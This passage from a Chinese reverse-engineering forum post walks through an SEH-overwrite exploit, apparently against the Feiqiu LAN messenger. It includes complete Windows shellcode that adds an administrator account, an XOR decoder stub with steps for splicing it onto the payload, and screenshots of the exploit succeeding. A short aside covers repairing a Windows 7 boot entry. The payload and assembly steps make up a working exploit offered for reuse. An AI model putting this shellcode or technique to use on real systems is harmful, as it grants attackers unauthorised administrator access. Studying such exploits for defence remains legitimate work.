
```c
char shellcode[]=//cteate a user:x

  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

  "\x66\x81\xec\x80\x00\x89\xe6\xe8\xb7\x00\x00\x00\x89\x06\x89\xc3" 

  "\x53\x68\x7e\xd8\xe2\x73\xe8\xbd\x00\x00\x00\x89\x46\x0c\x53\x68" 

  "\x8e\x4e\x0e\xec\xe8\xaf\x00\x00\x00\x89\x46\x08\x31\xdb\x53\x68" 

  "\x70\x69\x33\x32\x68\x6e\x65\x74\x61\x54\xff\xd0\x89\x46\x04\x89" 

  "\xc3\x53\x68\x5e\xdf\x7c\xcd\xe8\x8c\x00\x00\x00\x89\x46\x10\x53" 

  "\x68\xd7\x3d\x0c\xc3\xe8\x7e\x00\x00\x00\x89\x46\x14\x31\xc0\x31" 

  "\xdb\x43\x50\x68\x72\x00\x73\x00\x68\x74\x00\x6f\x00\x68\x72\x00" 

  "\x61\x00\x68\x73\x00\x74\x00\x68\x6e\x00\x69\x00\x68\x6d\x00\x69" 

  "\x00\x68\x41\x00\x64\x00\x89\x66\x1c\x50\x68\x58\x00\x00\x00\x89" 

  "\xe1\x89\x4e\x18\x68\x00\x00\x5c\x00\x50\x53\x50\x50\x53\x50\x51" 

  "\x51\x89\xe1\x50\x54\x51\x53\x50\xff\x56\x10\x8b\x4e\x18\x49\x49" 

  "\x51\x89\xe1\x6a\x01\x51\x6a\x03\xff\x76\x1c\x6a\x00\xff\x56\x14" 

  "\xff\x56\x0c\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c" 

  "\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24\x18" 

  "\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01" 

  "\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38" 

  "\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1" 

  "\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04" 

 "\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00";
```

大家可能已经看到代码是有`0`的，因此不能直接进行发送要先把代码进行加密后除`0`再发送。不然数据会被截断，不能全部被拷贝。

这个数据里进行了加密的话，因此在`shell code`的头上还应该加上解密头。我的解密头如下：这些代码是分析别的漏洞时积累下来的，如果大家用得着就自己留着吧。

```c
char shellcode_header[]=

"\xEB\x10\x58\x31\xC9\x66\x81\xC1\x22\xFF\x80\x30\x1D\x40\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF";
```

上面的红色的`22 FF`是要改变的有效的`shellcode`的长度。也就是`shellcode`的`Payload`。

### 这个加密头的用法：

- 首先把得到的`shellcode`进行加密后。分配一个目标缓冲区来存储加密后的+头的`shellcode`。
- 再把解密头先拷贝到目标区中去，拷贝前要把`22 FF`用真正的长度进行替换。
- 最后把加密后的有效`shellcode`拷贝到目标缓冲区的头的后面连接起来。

下面是对执行时的一些截图：

首先是处理到第二个`seh`入口。调用我们替换成的`pop`，`pop`，`ret`指令。

![](https://bbs.kanxue.com/upload/attach/201112/371321_lpwpb13d1wxw4is.jpg)

然后是返回到我们`shellcode`的入口处，跳过`handler`指针。到解码入口。

![](https://bbs.kanxue.com/upload/attach/201112/371321_r4yjn3eglqgiltm.jpg)

解码入口把`shellcode`进行解码。解码完后跳转出解码到真正的有效`shellcode`的入口处。进行执行。创建`'X'`用户

![](https://bbs.kanxue.com/upload/attach/201112/371321_9m6x5d9s6gbgjiz.jpg)

执行效果：

![](https://bbs.kanxue.com/upload/attach/201112/371321_sk261kzw87p72a1.jpg)

最后成功创建了管理员账户,说明成功进行了利用。

需要说明的是其它的系统如`windows server 2003` 若能够利用的话，可能也要重新定位`pop`，`pop`，`ret`的地址。

而`xp sp2`的话应该是不能利用了，听说 是加入了`SAFEseh`的功能。大家看法如何，欢迎回帖讨论。

### 参考资料：

`SEH`相关资料

[600K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0f1`.](https://bbs.kanxue.com/elink@a7bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0f1`.)

[ac6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0x3`.](https://bbs.kanxue.com/elink@2c6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0x3`.)

[e2eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0b7`.](https://bbs.kanxue.com/elink@4f5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6A6j5$3y4Z5K9h3&6S2i4K6u0W2y4e0q4Q4x3X3g2F1k6i4c8Q4x3V1k6K6K9r3!0%4i4K6g2X3j5i4u0@1K9h3y4D9k6g2)9J5k6i4m8Z5M7q4)9K6c8X3W2V1i4K6y4p5y4U0b7`.)

`seh`利用相关资料

一时找不到

今天早上来到教研室把昨天查看过的资料地址找到了，供大家参考，现在贴在下边

独家快递：覆盖SEH攻击的末日-SEHOPP:[217K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5%4c8G2j5$3W2G2i4K6u0W2j5$3!0E0i4K6u0W2j5$3&6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5h3y4G2L8h3#2W2L8Y4c8Q4x3V1j5K6z5e0m8Q4x3V1j5^5y4K6l9H3x3K6V1H3i4K6u0W2M7$3S2@1L8h3H3`.](https://bbs.kanxue.com/elink@89aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5%4c8G2j5$3W2G2i4K6u0W2j5$3!0E0i4K6u0W2j5$3&6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5h3y4G2L8h3#2W2L8Y4c8Q4x3V1j5K6z5e0m8Q4x3V1j5^5y4K6l9H3x3K6V1H3i4K6u0W2M7$3S2@1L8h3H3`.)

系统服务调用与异常分发：[b50K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4H3M7s2y4Q4x3X3g2Z5K9g2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0i4K6u0r3M7$3S2S2M7X3g2Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3V1j5J5x3e0t1&6z5o6j5^5x3b7`.`.](https://bbs.kanxue.com/elink@c98K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4H3M7s2y4Q4x3X3g2Z5K9g2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0i4K6u0r3M7$3S2S2M7X3g2Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3V1j5J5x3e0t1&6z5o6j5^5x3b7`.`.)

【翻译】绕过SEHOP安全机制<http://bbs.pediy.com/showthread.php?t=104707>

### 题外话：

昨天要安全检查,临时把电脑改成了`linux`的系统。这样检查起来就简单一些，因为`Linux`下没有那么多的工具可以使用，不小心把`win7`的启动时间改为`0`了，这样死活进不了`win7`。

本来早上就可以找到上面补的链接，可是因为进不了`win7`折腾了一上午，这里把改启动的方法告诉大家。`linux`下有一个`grub`启动管理器，可以管理多个系统的启动，可是我的电脑是`wubi`安装的，在`grub`中执行`sudo update-grub`后还是不能添加上`win7`的启动项。后来的解决方法是：因为是把`win7`的启动菜单的时间改为了`0`，`linux`的系统作为了默认的系统，这样就进不了`win7`，我的做法是先

`mount win7`所在的磁盘，然后再把`boot`目录中的`bcd`文件拷贝出来，可以拷到`u`盘中，然后在另外的电脑中找一个`easyBCD`的软件，可以对`win7`的启动配置进行修改。改好后再放回原来的位置，重启系统就可以进`win7`了。阿门

做了一个有界面的工具**【工具已撤，要的私下吧】**，方便大家测试，也把调试的源代码发了出来，供大家交流

![](https://bbs.kanxue.com/upload/attach/201112/371321_av2xfyhxunrpfid.jpg)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [飞秋利用点.jpg](javascript:void(0);)（121.77kb，1085次下载）
- [溢出函数入口点.jpg](javascript:void(0);)（32.67kb，1048次下载）
- [\_alloca\_function.png](javascript:void(0);)（116.27kb，1066次下载）
- [code.jpg](javascript:void(0);)（48.84kb，1027次下载）
- [stack.jpg](javascript:void(0);)（51.35kb，1024次下载）
- [seh和栈.jpg](javascript:void(0);)（106.33kb，1029次下载）
- [stack-seh.jpg](javascript:void(0);)（37.52kb，1018次下载）
- [调用规格.jpg](javascript:void(0);)（80.49kb，1026次下载）
- [mem.jpg](javascript:void(0);)（105.13kb，1026次下载）
- [拷贝示意图.jpg](javascript:void(0);)（27.73kb，1011次下载）
- [覆盖掉seh.jpg](javascript:void(0);)（33.57kb，1010次下载）
- [memdata.jpg](javascript:void(0);)（172.88kb，1008次下载）
- [定位数据.jpg](javascript:void(0);)（84.14kb，1002次下载）
- [callseh1.jpg](javascript:void(0);)（111.32kb，997次下载）
- [callseh2.jpg](javascript:void(0);)（83.95kb，991次下载）
- [popopret.jpg](javascript:void(0);)（7.32kb，967次下载）
- [effect.jpg](javascript:void(0);)（53.00kb，942次下载）
- [LAST1.jpg](javascript:void(0);)（107.68kb，960次下载）
- [LAST2.jpg](javascript:void(0);)（59.31kb，958次下载）
- [last3.jpg](javascript:void(0);)（98.76kb，960次下载）
- [firfor.rar](javascript:void(0);)（1.57MB，300次下载）
- [软件截图.jpg](javascript:void(0);)（16.10kb，948次下载）
